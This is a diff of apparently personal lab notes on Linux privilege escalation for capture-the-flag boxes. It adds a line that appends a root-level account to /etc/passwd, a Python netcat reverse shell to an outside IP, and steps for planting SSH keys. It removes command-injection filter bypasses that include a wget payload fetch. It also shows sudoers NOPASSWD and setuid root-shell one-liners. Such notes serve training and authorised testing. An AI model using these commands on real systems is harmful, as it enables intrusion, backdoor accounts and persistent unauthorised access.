@@ -57,7 +57,7 @@ rlwrap nc -lvnp <port>
 ```
 {% endcode %}
 
-<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="419"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="419"><figcaption></figcaption></figure></div>
 
 ## Checklist
 
@@ -67,12 +67,7 @@ rlwrap nc -lvnp <port>
   * Add to sudoers
   * Copy file, change ownership, symlink
   * Revshell
-* System Information:
-  * Hostname
-  * Networking details:
-  * Current IP
-  * Default route details
-  * DNS server information
+  * User history such as .`zsh_history` or .`bash_history`
 * User Information:
   * Current user details
   * Last logged on users
@@ -96,17 +91,6 @@ rlwrap nc -lvnp <port>
 * Environmental:
   * Display current $PATH
   * Displays env information
-* Jobs/Tasks:
-  * List all cron jobs
-  * Locate all world-writable cron jobs
-  * Locate cron jobs owned by other users of the system
-  * List the active and inactive systemd timers
-* Services:
-  * List network connections (TCP & UDP)
-  * List running processes
-  * Lookup and list process binaries and associated permissions
-  * List inetd.conf/xined.conf contents and associated binary file permissions
-  * List init.d binary permissions
 * Version Information (of the following):
   * Sudo
   * MYSQL
@@ -144,6 +128,12 @@ Run a file as another user entirely
 ```
 echo “[user] ALL=(ALL) NOPASSWD: ALL” >> /etc/sudoers
 echo "alice ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
+```
+
+#### Add root user
+
+```
+pw=$(openssl passwd Password123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
 
 If `LD_PRELOAD` is explicitly defined in the sudoers file
@@ -214,45 +204,21 @@ More complex privilege control, run only specified actions with elevated privile
 ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-### Command Injection <a href="#kernel" id="kernel"></a>
-
-{% hint style="info" %}
-OS Injection under Web Servers & Languages
-{% endhint %}
-
-`;` ends a command and `#` comments out the rest of an existing one\
-`&` may have to be URL encoded in web payloads
-
-Any website/interface that provides an input might be running a command with the input as a parameter, think carefully
-
-{% code title="Bypass Character Filters" %}
-```
-${IFS} - Internal Field Separator, default variable in bash [Alternative to whitespace]
-
-#Curly brace expansion
-0xdf;{ping,-c,1,10.10.14.23};#
-0xdf;ping -c 1 10.10.14.23;#
-
-\r\n -> EOL, similar function to ';'
-%0d : \r [Carriage return]
-%0a : \n
-%09 : \t
-
-#Quotes was also not URL encoded
-password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
-```
-{% endcode %}
-
 ### Binary Tracing <a href="#kernel" id="kernel"></a>
 
+{% hint style="info" %}
+Magic \[HTB Linux]
+{% endhint %}
+
 ```bash
+strings [bin]
 strace -f [bin] [follows forks too, see the exec calls]
 ltrace [bin] also works lowk
 ```
 
 ### PATH <a href="#kernel" id="kernel"></a>
 
-When the exact path of a binary is not called, prepend our's and it gets called first
+When the exact path of a binary is not called, prepend our malicious one and it gets called first
 
 ```bash
 echo $PATH
@@ -262,7 +228,7 @@ export PATH=<PATH/TO/FOLDER>:$PATH
 
 ### Symlink
 
-Any operations involving backup/zip/file handling as sudo
+Any operations involving backup/zip/file handling as sudo -> you know the play
 
 ```bash
 ln -s [target_file] [source_file]
@@ -324,3 +290,32 @@ ls /boot | grep vmlinuz-
 {% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------" %}
 READ from HTB Usage
 {% endembed %}
+
+### Languages
+
+#### Python
+
+```
+import os
+os.system("busybox nc 192.168.45.154 3306 -e bash")
+```
+
+## SSH
+
+User password may be same as key passphrase
+
+Check `/etc/ssh/sshd_config` if there are any problems&#x20;
+
+### SSH Keys
+
+Every revshell as an actual user -> this is the play
+
+```
+KALI
+ssh-keygen -t rsa
+chmod 700 ~/.ssh; chmod 600 ~/.ssh/id_rsa [kali]
+
+REMOTE
+/home/user/.ssh$ echo "[id_rsa.pub value]" > authorized_keys
+chmod 700 .ssh; chmod 700 .ssh/authorized_keys
+```
